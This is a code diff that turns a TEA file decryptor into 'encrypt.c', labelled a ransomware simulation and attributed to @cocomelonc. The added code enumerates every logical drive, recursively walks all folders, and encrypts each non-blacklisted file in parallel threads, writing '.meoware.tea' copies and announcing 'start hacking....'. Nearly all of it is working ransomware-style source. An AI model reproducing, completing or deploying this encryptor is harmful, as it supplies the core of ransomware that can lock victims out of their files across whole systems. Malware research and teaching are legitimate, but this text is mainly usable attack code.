@@ -1,7 +1,7 @@
 /*
- * decrypt.c
+ * encrypt.c
  * Ransomware simulation with TEA
- * decrypt entire filesystem
+ * encrypt entire filesystem
  * author: @cocomelonc
 */
 #include <windows.h>
@@ -28,24 +28,24 @@ const char* blacklistDirectories[] = {
   "Z:\\",
 };
 
-// structure to hold data for each thread
+// Structure to hold data for each thread
 struct ThreadData {
   const char* inputFile;
   const char* outputFile;
   const BYTE* teaKey;
 };
 
-void tea_decrypt(unsigned char *data, unsigned char *key) {
+void tea_encrypt(unsigned char *data, unsigned char *key) {
   unsigned int i;
   unsigned int delta = 0x9e3779b9;
-  unsigned int sum = delta * ROUNDS;
+  unsigned int sum = 0;
   unsigned int v0 = *(unsigned int *)data;
   unsigned int v1 = *(unsigned int *)(data + 4);
 
   for (i = 0; i < ROUNDS; i++) {
-    v1 -= (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + ((unsigned int *)key)[(sum >> 11) & 3]);
-    sum -= delta;
-    v0 -= (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + ((unsigned int *)key)[sum & 3]);
+    v0 += (((v1 << 4) ^ (v1 >> 5)) + v1) ^ (sum + ((unsigned int *)key)[sum & 3]);
+    sum += delta;
+    v1 += (((v0 << 4) ^ (v0 >> 5)) + v0) ^ (sum + ((unsigned int *)key)[(sum >> 11) & 3]);
   }
 
   *(unsigned int *)data = v0;
@@ -88,7 +88,7 @@ void removePadding(HANDLE fileHandle) {
       for (size_t i = 0; i < paddingSize; ++i) {
         if (padding[i] != static_cast<char>(paddingSize)) {
           // invalid padding, print an error message or handle it accordingly
-          printf("invalid padding found in the file.\n");
+          printf("invalid padding found in the file: %d - %s\n", GetLastError(), strerror(GetLastError()));
           free(padding);
           return;
         }
@@ -98,78 +98,74 @@ void removePadding(HANDLE fileHandle) {
       SetEndOfFile(fileHandle);
     } else {
       // error reading the padding bytes, print an error message or handle it accordingly
-      printf("error reading padding bytes from the file.\n");
+      printf("error reading padding bytes from the file: %d - %s\n", GetLastError(), strerror(GetLastError()));
     }
 
     free(padding);
   } else {
     // invalid padding size, print an error message or handle it accordingly
-    printf("invalid padding size: %d\n", paddingSize);
+    printf("invalid padding size: %d - %d - %s\n", paddingSize, GetLastError(), strerror(GetLastError()));
   }
 }
 
-void decryptFile(const char* inputFile, const char* outputFile, const unsigned char* teaKey) {
+void encryptFile(const char* inputFile, const char* outputFile, const unsigned char* teaKey) {
   HANDLE ifh = CreateFileA(inputFile, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
   HANDLE ofh = CreateFileA(outputFile, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
 
   if (ifh == INVALID_HANDLE_VALUE || ofh == INVALID_HANDLE_VALUE) {
-    printf("error opening file.\n");
+    printf("error opening file: %s - %d - %s\n", inputFile, GetLastError(), strerror(GetLastError()));
     return;
   }
 
   LARGE_INTEGER fileSize;
   GetFileSizeEx(ifh, &fileSize);
 
-  unsigned char* fileData = (unsigned char*)malloc(fileSize.LowPart);
-  DWORD bytesRead;
-  ReadFile(ifh, fileData, fileSize.LowPart, &bytesRead, NULL);
+  if (fileSize.QuadPart > 0) {
+    unsigned char* fileData = (unsigned char*)malloc(fileSize.LowPart);
+    DWORD bytesRead;
+    ReadFile(ifh, fileData, fileSize.LowPart, &bytesRead, NULL);
 
-  unsigned char key[KEY_SIZE];
-  memcpy(key, teaKey, KEY_SIZE);
+    unsigned char key[KEY_SIZE];
+    memcpy(key, teaKey, KEY_SIZE);
 
-  // decrypt the file data using TEA encryption
-  for (DWORD i = 0; i < fileSize.LowPart; i += TEA_BLOCK_SIZE) {
-    tea_decrypt(fileData + i, key);
-  }
+    // calculate the padding size
+    size_t paddingSize = (TEA_BLOCK_SIZE - (fileSize.LowPart % TEA_BLOCK_SIZE)) % TEA_BLOCK_SIZE;
 
-  // calculate the padding size
-  size_t paddingSize = fileData[fileSize.LowPart - 1];
+    // pad the file data
+    size_t paddedSize = fileSize.LowPart + paddingSize;
+    unsigned char* paddedData = (unsigned char*)malloc(paddedSize);
+    memcpy(paddedData, fileData, fileSize.LowPart);
+    memset(paddedData + fileSize.LowPart, static_cast<char>(paddingSize), paddingSize);
 
-  // validate and remove padding
-  if (paddingSize <= TEA_BLOCK_SIZE && paddingSize > 0) {
-    size_t originalSize = fileSize.LowPart - paddingSize;
-    unsigned char* originalData = (unsigned char*)malloc(originalSize);
-    memcpy(originalData, fileData, originalSize);
+    // encrypt the padded data
+    for (size_t i = 0; i < paddedSize; i += TEA_BLOCK_SIZE) {
+      tea_encrypt(paddedData + i, key);
+    }
 
-    // write the decrypted data to the output file
+    // write the encrypted data to the output file
     DWORD bw;
-    WriteFile(ofh, originalData, originalSize, &bw, NULL);
+    WriteFile(ofh, paddedData, paddedSize, &bw, NULL);
 
-    printf("%s: TEA decryption successful\n", inputFile);
+    printf("%s: TEA encryption successful\n", inputFile);
 
-    CloseHandle(ifh);
-    CloseHandle(ofh);
     free(fileData);
-    free(originalData);
+    free(paddedData);
   } else {
-    // invalid padding size, print an error message or handle it accordingly
-    printf("invalid padding size: %d\n", paddingSize);
-
-    CloseHandle(ifh);
-    CloseHandle(ofh);
-    free(fileData);
+    printf("%s: File size is 0. Skipping encryption...\n", inputFile);
   }
+
+  CloseHandle(ifh);
+  CloseHandle(ofh);
 }
 
-
-// decryption function to be called by each thread
-unsigned __stdcall decryptFileThread(void* args) {
+// encryption function to be called by each thread
+unsigned __stdcall encryptFileThread(void* args) {
   struct ThreadData* threadData = (struct ThreadData*)args;
-  decryptFile(threadData->inputFile, threadData->outputFile, threadData->teaKey);
+  encryptFile(threadData->inputFile, threadData->outputFile, threadData->teaKey);
   return 0;
 }
 
-void decryptFiles(const char* folderPath, const BYTE* key) {
+void encryptFiles(const char* folderPath, const BYTE* key) {
   WIN32_FIND_DATAA findFileData;
   char searchPath[MAX_PATH];
   sprintf_s(searchPath, MAX_PATH, "%s\\*", folderPath);
@@ -195,8 +191,8 @@ void decryptFiles(const char* folderPath, const BYTE* key) {
     sprintf_s(filePath, MAX_PATH, "%s\\%s", folderPath, fileName);
 
     if (findFileData.dwFileAttributes & FILE_ATTRIBUTE_DIRECTORY) {
-      // recursive call for subfolders
-      decryptFiles(filePath, key);
+      // enumerate subdirectories
+      encryptFiles(filePath, key);
     } else {
       int isBlacklisted = 0;
       for (int i = 0; i < MAX_PATH_LENGTH; ++i) {
@@ -205,16 +201,16 @@ void decryptFiles(const char* folderPath, const BYTE* key) {
           break;
         }
       }
-
-      if (!isBlacklisted && strstr(fileName, ".meoware.tea") != NULL) {
+    
+      if (!isBlacklisted) {
         // process individual files
         printf("file: %s\n", filePath);
-        char decryptedFilePath[MAX_PATH];
-        sprintf_s(decryptedFilePath, MAX_PATH, "%s.decrypted", filePath);
-        struct ThreadData threadData = { filePath, decryptedFilePath, key };
+        char encryptedFilePath[MAX_PATH];
+        sprintf_s(encryptedFilePath, MAX_PATH, "%s.meoware.tea", filePath);
+        struct ThreadData threadData = { filePath, encryptedFilePath, key };
 
-        // start a new thread
-        threadHandles[threadCount] = (HANDLE)_beginthreadex(NULL, 0, &decryptFileThread, (void*)&threadData, 0, NULL);
+        // Start a new thread
+        threadHandles[threadCount] = (HANDLE)_beginthreadex(NULL, 0, &encryptFileThread, (void*)&threadData, 0, NULL);
         if (threadHandles[threadCount] == 0) {
           printf("error creating thread: %d - %s\n", GetLastError(), strerror(GetLastError()));
           return;
@@ -233,10 +229,9 @@ void decryptFiles(const char* folderPath, const BYTE* key) {
 
           threadCount = 0;
         }
-        printf("file decrypt: %s OK!\n", filePath);
+        printf("file: %s OK!\n", filePath);
       }
     }
-
   } while (FindNextFileA(hFind, &findFileData) != 0);
 
   // wait for remaining threads to finish
@@ -249,7 +244,6 @@ void decryptFiles(const char* folderPath, const BYTE* key) {
 
   FindClose(hFind);
 }
-
 
 void enumerateDrives(char folders[][MAX_PATH_LENGTH], int* folderCount) {
   DWORD drives = GetLogicalDrives();
@@ -285,11 +279,11 @@ int main() {
   char folders[MAX_FOLDERS][MAX_PATH];
   int folderCount = 0;
   enumerateDrives(folders, &folderCount);
-  printf("start decrypting....\n");
+  printf("start hacking....\n");
   Sleep(10);
   for (int i = 0; i < folderCount; ++i) {
     printf("%s\n", folders[i]);
-    decryptFiles(folders[i], (const unsigned char*)teaKey);
+    encryptFiles(folders[i], (const unsigned char*)teaKey);
   }
   return 0;
 }
